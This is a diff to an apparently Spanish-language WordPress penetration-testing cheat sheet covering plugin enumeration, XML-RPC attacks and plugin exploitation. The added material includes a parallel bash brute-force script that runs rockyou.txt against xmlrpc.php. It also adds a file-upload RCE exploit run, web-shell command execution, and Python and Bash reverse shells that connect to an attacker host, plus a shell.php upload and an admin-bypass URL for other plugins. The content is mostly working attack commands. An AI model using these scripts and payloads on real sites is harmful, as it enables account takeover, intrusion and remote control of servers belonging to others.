@@ -92,7 +92,7 @@ admin:password
 ❯ wpscan --url http://<IP>/ -e u,vp,vt,dbe
 # vt → temas vulnerables | dbe → bases de datos expuestas
 
-❯ wpscan --url http://<IP>/ -e u,vp --plugins-detection aggressive
+❯ wpscan --url http://<IP>/  -e ap --plugins-detection aggressive     <- IMPORTANTE
 # aggressive → más completo | mixed → por defecto | passive → silencioso
 ```
 
@@ -160,8 +160,7 @@ Paso 1:
 ❯ curl -s -X GET "http://<IP>/xmlrpc.php"
 # Devuelve mensaje → confirma que está disponible (solo acepta POST)
 
-❯ curl -s -X POST "http://<IP>/xmlrpc.php" \
-  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
+❯ curl -s -X POST "http://<IP>/xmlrpc.php" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
 # Listar métodos → buscar wp.getUsersBlogs → permite fuerza bruta
 ```
 
@@ -192,43 +191,53 @@ Paso 2:
 # Script para obtener la password de un usuario válido vía XMLRPC
 # Poner un usuario válido 
 # Colocar la IP del server 
-#!/bin/bash 
+#!/bin/bash
 
-function ctrl_c(){
-	echo -e "\n\n[!] Saliendo...\n"
-	tput cnorm; exit 1
-}
+USUARIO="admin"
+TARGET="http://IP_Server/xmlrpc.php"
+HILOS=10  # Número de procesos paralelos
 
-# Ctrl_c
-trap ctrl_c INT
-
+trap 'tput cnorm; killall curl 2>/dev/null; exit 1' INT
 tput civis
 
-function createXML(){
-	password=$1
+function crackear(){
+    password=$1
+    contador=$2
+    total=$3
 
-	xmlFile="""
-	<?xml version=\"1.0\" encoding=\"UTF-8\"?>
-	<methodCall> 
-	<methodName>wp.getUsersBlogs</methodName> 
-	<params> 
-	<param><value>user</value></param> 
-	<param><value>$password</value></param> 
-	</params> 
-	</methodCall>
-	"""
-	echo $xmlFile > file.xml
-	response=$(curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml)
+    echo -ne "[*] Intento $contador/$total | Usuario: $USUARIO | Password: $password\r"
 
-	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
-		echo -e "\n[+] La contraseña es $password"
-		echo 0
-	fi
+    xmlFile="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>$USUARIO</value></param>
+<param><value>$password</value></param>
+</params>
+</methodCall>"
+
+    response=$(curl -s -X POST "$TARGET" -d "$xmlFile")
+
+    if ! echo "$response" | grep -q 'Incorrect username or password'; then
+        echo -e "\n\n[+] ¡¡¡ CONTRASEÑA ENCONTRADA !!!"
+        echo -e "[+] Usuario: $USUARIO"
+        echo -e "[+] Password: $password\n"
+        echo "$password" > password_found.txt
+        exit 0
+    fi
 }
 
-cat /usr/share/wordlists/rockyou.txt | while read password; do 
-	createXML $password
-done 
+export -f crackear
+export USUARIO TARGET
+
+total=$(wc -l < /usr/share/wordlists/rockyou.txt)
+
+cat /usr/share/wordlists/rockyou.txt | \
+nl | \
+xargs -P $HILOS -I {} bash -c 'crackear $(echo {} | awk "{print \$2}") $(echo {} | awk "{print \$1}") '$total
+
+echo -e "\n[!] No se encontró contraseña"
+tput cnorm
 ```
 
 ```bash 
@@ -239,10 +248,32 @@ Paso 3:
 
 
 ## 5. EXPLOTAR UN PLUGIN  VULNERABLE 
+
+### Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
+* [PoC](https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/)
+```bash 
+❯ python poc.py http://IP_server    # Ejecutar el script paraa subir el archivo y tener un RCE
+
+Devuelve: 
+[+] Exploit work !
+	URL: http://IP_Server/wp-content/uploads/simple-file-list/161.php
+	Password: eb4f519b80a96a1495814ea779d77c1d
+```
+
+```bash
+# Ejecutar comandos 
+❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('id');"
+
+# Revershell con Python
+❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('which%20python3');"   # Ver si python3 esta instalado 
+❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('python3%20-c%20%22import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27IP_Kali%27,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);subprocess.call([%27/bin/bash%27,%27-i%27])%22');"
+
+# Revershell con Bash 
+❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('bash%20-i%20>%26%20/dev/tcp/IP_Kali/80%200>%261');"
+```
+
 ### Wpstorecart 2.5.27 a 2.5.29
-
 * [CVE-2012-3576](https://www.exploit-db.com/exploits/19023)
-
 ```bash
 ❯ curl -F "Filedata=@./shell.php" http://<IP>/wp-content/plugins/wpstorecart/php/upload.php
 # Requiere plugin wpstorecart vulnerable
@@ -261,9 +292,7 @@ Paso 3:
 ```
 
 ### Modular DS < 2.5.2 - CVE-2026-23550: Privilege Escalation 
-
 * [CVE-2026-23550](https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/)
-
 ```bash 
 # Colocar esta url en el navegador y automáaticamente ingresas al panel del admin 
 http://IP/api/modular-connector/login/anything?origin=mo&type=foo
